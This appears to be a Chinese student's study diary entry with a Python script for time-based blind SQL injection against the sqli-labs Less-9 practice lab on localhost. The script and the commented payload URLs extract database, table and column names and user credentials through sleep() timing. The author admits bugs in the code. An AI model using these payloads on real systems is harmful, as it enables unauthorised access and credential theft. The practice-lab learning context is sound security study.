2018.11.6
今天开始准备好好学习编程，希望不是三分钟热度。或者说在大二做一件在我看来很酷的事！
今天写了关于时间盲注的小脚本，速度很慢！


#http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (length(database()))=7 %23
#http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) %23
#http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5)) %23
#http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),1,1))=117,1,sleep(5)) %23
#http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select group_concat(id,username,password) from users limit 0,1),1,1))=49,1,sleep(5)) %23

import requests
import sys

#判断数据库长度

#length=0
url='http://127.0.0.1/sqli-labs-master/Less-9/?id=1'
#print("Start to injet the length of database:")
#for i in range(0,20):
#    payload="' and (length(database()))={} %23".format(i)
#    target=url+payload
#    result=requests.get(target).text

#查询数据库名
'''
database_name=''
print("Start to injet the name of database:")
for i in range(1,11):
    for j in range(97,121):
        payload=url+"' and if(ascii(substr(database(),{0},1))={1},1,sleep(5)) %23".format(i,j)
        #before_time=time.time()
        try:
            r=requests.get(payload,timeout=3)
            database_name += chr(j)
            print("database name is:" + database_name)

            break
        except Exception as e:
            print("现在查询到："+chr(j)+" !")

    
#查询表名

database_name='security'
table_name=''
print("Start to injet the name of table:")
for i in range(1,10):
    for j in range(97,121):
        payload=url+"'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'{0}\' limit 0,1),{1},1))={2},1,sleep(5)) %23".format(database_name,i,j)
        try:
            #print(payload)
            r=requests.get(payload,timeout=3)
            table_name += chr(j)
            print("table name is:" + table_name)
            break
        except Exception as e:
            print("现在查询到："+chr(j)+" !")


#查字段
table_name='emails'
column_name=''
print("It's time to inject the column name !")
for i in range(1,20):
    for j in range(97,121):
        payload=url+"' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'{0}\' limit 0,1),{1},1))={2},1,sleep(5)) %23".format(table_name,i,j)
        try:
            r=requests.get(payload,timeout=3)
            column_name+=chr(j)
            print("column name is :"+ column_name)
            break
        except Exception as e:
            print("现在查询到: "+ chr(j)+" !")
'''
#查信息

content=""
column='users'
print("Now,injecting the content !")
for i in range(1,20):
    for j in range(97,121):
        payload=url+"' and if(ascii(substr((select group_concat(id,username,password) from \'{0}\' limit 0,1),{1},1))={2},1,sleep(5)) %23".format(column,i,j)
        try:
            r=requests.get(payload,timeout=3)
            content+=chr(j)
            print("contents are :"+content)
            break
        except Exception as e:
            print("现在查询到: " + chr(j) + " !")
            
            
使用requests.get(url)返回response对象。该对象包含服务返回的所有信息。
我们可以使用该对象进行操作，比如得到网页信息:r.text,查看网页的状态信息：r.status_code,还有r.content,r,apparent_encoding等常用的属性。

代码的try,except语句的含义是：尝试去获取网页信息，如果超时，即执行了sleep语句，则将错误信息保存在e中，输出友好的错误信息。显然
这个版本的错误控制完全没有起到作用。

写代码的过程中出现的问题有：
没有求数据库名的长度，认为这个功能不是很实用。
查询表名的时候问题很大。查询一个之后循环就终止了，还没有解决。
明天解决遗留问题！
编程挑战的第一天，加油！
